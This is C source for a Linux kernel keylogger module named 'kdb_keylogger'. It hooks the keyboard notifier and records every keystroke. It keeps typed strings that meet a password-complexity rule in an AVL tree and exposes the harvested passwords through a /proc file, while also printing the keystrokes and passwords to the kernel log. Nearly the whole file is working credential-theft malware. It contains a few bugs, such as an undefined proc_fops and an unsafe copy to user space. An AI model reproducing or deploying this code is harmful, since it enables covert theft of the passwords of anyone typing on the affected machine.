#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/keyboard.h>
#include <asm/uaccess.h>
#include <asm/io.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <stdbool.h>

#define PROC_FILE_NAME "kdb_keylogger"
#define MAX_PASSWORDS 100
#define MAX_PASSWORD_LENGTH 15
#define MAX_BUFFER_SIZE (MAX_PASSWORDS * (MAX_PASSWORD_LENGTH + 1))

bool shift_pressed = false;
char key_buffer[MAX_BUFFER_SIZE * 2];
int buffer_index = 0;

struct notifier_block nb;

// AVL Tree Node Definition
struct avl_node {
    char *password;
    struct avl_node *left;
    struct avl_node *right;
    int height;
};

// Function to get the height of a node
int height(struct avl_node *node) {
    if (node == NULL)
        return 0;
    return node->height;
}

// Function to update the height of a node
int update_height(struct avl_node *node) {
    return 1 + max(height(node->left), height(node->right));
}

// Utility function to perform right rotation
struct avl_node *right_rotate(struct avl_node *y) {
    struct avl_node *x = y->left;
    struct avl_node *T2 = x->right;

    x->right = y;
    y->left = T2;

    y->height = update_height(y);
    x->height = update_height(x);

    printk(KERN_DEBUG "Right rotation performed on node with password: %s\n", y->password);
    return x;
}

// Utility function to perform left rotation
struct avl_node *left_rotate(struct avl_node *x) {
    struct avl_node *y = x->right;
    struct avl_node *T2 = y->left;

    y->left = x;
    x->right = T2;

    x->height = update_height(x);
    y->height = update_height(y);

    printk(KERN_DEBUG "Left rotation performed on node with password: %s\n", x->password);
    return y;
}

// Get the balance factor of a node
int balance_factor(struct avl_node *node) {
    if (node == NULL)
        return 0;
    return height(node->left) - height(node->right);
}

// Insert a password into the AVL tree
struct avl_node *insert(struct avl_node *node, const char *password) {
    // 1. Perform the normal BST insert
    if (node == NULL) {
        struct avl_node *new_node = kmalloc(sizeof(struct avl_node), GFP_KERNEL);
        if (new_node) {
            new_node->password = kmalloc(strlen(password) + 1, GFP_KERNEL);
            if (new_node->password)
                strcpy(new_node->password, password);
            new_node->left = new_node->right = NULL;
            new_node->height = 1;
            printk(KERN_DEBUG "Inserted new node with password: %s\n", password);
            return new_node;
        }
        printk(KERN_ERR "Failed to allocate memory for new node\n");
        return NULL;
    }

    if (strcmp(password, node->password) < 0)
        node->left = insert(node->left, password);
    else if (strcmp(password, node->password) > 0)
        node->right = insert(node->right, password);
    else
        return node;

    // 2. Update the height of the ancestor node
    node->height = update_height(node);

    // 3. Get the balance factor and balance the tree
    int balance = balance_factor(node);

    printk(KERN_DEBUG "Balance factor for node with password %s is %d\n", node->password, balance);

    // Left Left Case
    if (balance > 1 && strcmp(password, node->left->password) < 0) {
        printk(KERN_DEBUG "Left Left case detected for node with password: %s\n", node->password);
        return right_rotate(node);
    }

    // Right Right Case
    if (balance < -1 && strcmp(password, node->right->password) > 0) {
        printk(KERN_DEBUG "Right Right case detected for node with password: %s\n", node->password);
        return left_rotate(node);
    }

    // Left Right Case
    if (balance > 1 && strcmp(password, node->left->password) > 0) {
        printk(KERN_DEBUG "Left Right case detected for node with password: %s\n", node->password);
        node->left = left_rotate(node->left);
        return right_rotate(node);
    }

    // Right Left Case
    if (balance < -1 && strcmp(password, node->right->password) < 0) {
        printk(KERN_DEBUG "Right Left case detected for node with password: %s\n", node->password);
        node->right = right_rotate(node->right);
        return left_rotate(node);
    }

    return node;
}

// In-order traversal of the AVL tree to print passwords
void in_order_traversal(struct avl_node *root, char *buf, size_t *pos) {
    if (root != NULL) {
        printk(KERN_DEBUG "Traversing node with password: %s\n", root->password);

        in_order_traversal(root->left, buf, pos);

        size_t len = strlen(root->password);  // Get the length of the password

        // Check if there is enough space in the buffer to store the password and a newline
        if (*pos + len + 1 <= MAX_BUFFER_SIZE) {
            printk(KERN_DEBUG "Writing password to buffer: %s\n", root->password);
            memcpy(buf + *pos, root->password, len);
            *pos += len;
            buf[*pos] = '\n';
            (*pos)++;
        } else {
            // If the buffer is full, stop adding passwords and handle the overflow.
            // You could choose to flush the buffer here (e.g., write it to /proc) if necessary.
            printk(KERN_DEBUG "Buffer overflow detected, no space to write password: %s\n", root->password);
            // Buffer is full, so stop adding more data.
        }

        in_order_traversal(root->right, buf, pos);
    }
}


// Function to free the AVL tree recursively
void free_avl_tree(struct avl_node *node) {
    if (node == NULL)
        return;

    // Recursively free the left and right subtrees
    free_avl_tree(node->left);
    free_avl_tree(node->right);

    // Free the password and the node itself
    if (node->password) {
        kfree(node->password);
    }
    kfree(node);
}

// Global root of the AVL tree
struct avl_node *password_tree_root = NULL;

// Function to check if the current password meets the password policy
bool check_password_requirements(char *password, int length) {
    bool has_lowercase = false;
    bool has_uppercase = false;
    bool has_number = false;
    bool has_symbol = false;

    int i = 0;
    while (i < length) {
        if (password[i] >= 'a' && password[i] <= 'z') {
            has_lowercase = true;
        }
        if (password[i] >= 'A' && password[i] <= 'Z') {
            has_uppercase = true;
        }
        if (password[i] >= '0' && password[i] <= '9') {
            has_number = true;
        }
        if (strchr("!@#$%^&*()_+-=<>?/.,", password[i])) {
            has_symbol = true;
        }
        i++;
    }

    // Password is valid if it has at least 3 of the 4 types
    int valid_count = has_lowercase + has_uppercase + has_number + has_symbol;
    bool valid = valid_count >= 3;

    printk(KERN_DEBUG "Password check result for %s: %s\n", password, valid ? "valid" : "invalid");

    return valid;
}

// Simple read function for proc file (display captured valid passwords)
ssize_t read_simple(struct file *filp, char *buf, size_t count, loff_t *offp) {
    size_t pos = 0;

    // Ensure we traverse the tree and fill the buffer
    in_order_traversal(password_tree_root, key_buffer, &pos);

    // If the offset is beyond the content, return 0 (EOF)
    if (*offp >= pos)
        return 0;

    // Calculate how much data can be returned
    if (count > pos - *offp)
        count = pos - *offp;

    // Copy the buffer content to the user-space buffer
    memcpy(buf, key_buffer + *offp, count);
    *offp += count;

    return count;
}

// Map the keycode to its corresponding string (Shift logic handled)
const char *keycode_to_string(int keycode) {
    if (shift_pressed) {
        switch (keycode) {
            case 16: return "Q"; case 17: return "W"; case 18: return "E";
            case 19: return "R"; case 20: return "T"; case 21: return "Y";
            case 22: return "U"; case 23: return "I"; case 24: return "O";
            case 25: return "P"; case 30: return "A"; case 31: return "S";
            case 32: return "D"; case 33: return "F"; case 34: return "G";
            case 35: return "H"; case 36: return "J"; case 37: return "K";
            case 38: return "L"; case 44: return "Z"; case 45: return "X";
            case 46: return "C"; case 47: return "V"; case 48: return "B";
            case 49: return "N"; case 50: return "M";
            case 2: return "!"; case 3: return "@"; case 4: return "#";
            case 5: return "$"; case 6: return "%"; case 7: return "^";
            case 8: return "&"; case 9: return "*"; case 10: return "(";
            case 11: return ")";
            case 12: return "_"; case 13: return "+"; case 39: return ":";
            case 43: return "|"; case 26: return "{"; case 27: return "}";
            case 41: return "~"; case 51: return "<"; case 52: return ">";
            case 53: return "?";
            default: return ",";
        }
    }

    // Regular (non-shifted) characters
    switch (keycode) {
        case 16: return "q"; case 17: return "w"; case 18: return "e";
        case 19: return "r"; case 20: return "t"; case 21: return "y";
        case 22: return "u"; case 23: return "i"; case 24: return "o";
        case 25: return "p"; case 30: return "a"; case 31: return "s";
        case 32: return "d"; case 33: return "f"; case 34: return "g";
        case 35: return "h"; case 36: return "j"; case 37: return "k";
        case 38: return "l"; case 44: return "z"; case 45: return "x";
        case 46: return "c"; case 47: return "v"; case 48: return "b";
        case 49: return "n"; case 50: return "m";
        case 2: return "1"; case 3: return "2"; case 4: return "3";
        case 5: return "4"; case 6: return "5"; case 7: return "6";
        case 8: return "7"; case 9: return "8"; case 10: return "9";
        case 11: return "0"; case 12: return "-"; case 13: return "=";
        default: return ",";
    }
}

// Function to handle key events
int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void *data) {
    bool add = true;
    struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;

    if (kp->down) {
        const char *key = keycode_to_string(kp->value);

        // If the buffer is full or Enter/Space is pressed, validate the password
        if (buffer_index == MAX_BUFFER_SIZE || kp->value == 28 || kp->value == 57) {
            if (buffer_index > 0) {  // Only attempt insertion if there is something to insert
                bool is_valid = check_password_requirements(key_buffer, buffer_index);
                if (is_valid) {
                    printk(KERN_INFO "Valid password entered: %s\n", key_buffer);

                    // Insert the valid password into the AVL tree
                    password_tree_root = insert(password_tree_root, key_buffer);
                } else {
                    printk(KERN_INFO "Invalid password entered: %s\n", key_buffer);
                }

                // Reset the buffer after insertion
                memset(key_buffer, 0, MAX_BUFFER_SIZE * 2);
                buffer_index = 0;
            }
        }

        // If key is Enter, Space, or buffer is full, clear buffer
        if (kp->value == 28 || kp->value == 57 || buffer_index >= MAX_BUFFER_SIZE) {
            printk(KERN_INFO "Clearing buffer due to Enter/Space key or buffer overflow\n");
            memset(key_buffer, 0, MAX_BUFFER_SIZE * 2); 
            buffer_index = 0;
        }

        // Handle delete key (backspace or delete key)
        if (kp->value == 14 || kp->value == 111) { 
            if (buffer_index > 0) {
                buffer_index--;
                key_buffer[buffer_index] = '\0';
                printk(KERN_INFO "Deleting last character, buffer now: %s\n", key_buffer);
            }
            add = false;
        }

        // Concatenate key press to the buffer if buffer isn't full
        if (buffer_index < MAX_BUFFER_SIZE) {
            if (key == ",") {
                add = false;
            }

            if (add == true) {
                printk(KERN_INFO "Adding key to buffer: %s at buffer index: %d\n", key, buffer_index);
                key_buffer[buffer_index] = key[0];
                buffer_index++;
                key_buffer[buffer_index] = '\0';
                add = true;
            }
        }

        printk(KERN_INFO "Key pressed: %s, buffer: %s\n", key, key_buffer);
    }

    // Detect Shift key state changes
    if (kp->value == 42 || kp->value == 54) {
        shift_pressed = kp->down;
    }

    return 0;
}

// Module initialization
int init(void) {
    nb.notifier_call = kb_notifier_fn;
    register_keyboard_notifier(&nb);
    proc_create(PROC_FILE_NAME, 0, NULL, &proc_fops);
    printk(KERN_INFO "Proc file created\n");
    return 0;
}

// Module cleanup
void cleanup(void) {
    // Free memory allocated for AVL tree
    free_avl_tree(password_tree_root);
    unregister_keyboard_notifier(&nb);
    remove_proc_entry(PROC_FILE_NAME, NULL);
    printk(KERN_INFO "Proc file removed\n");
}

MODULE_LICENSE("GPL");
module_init(init);
module_exit(cleanup);
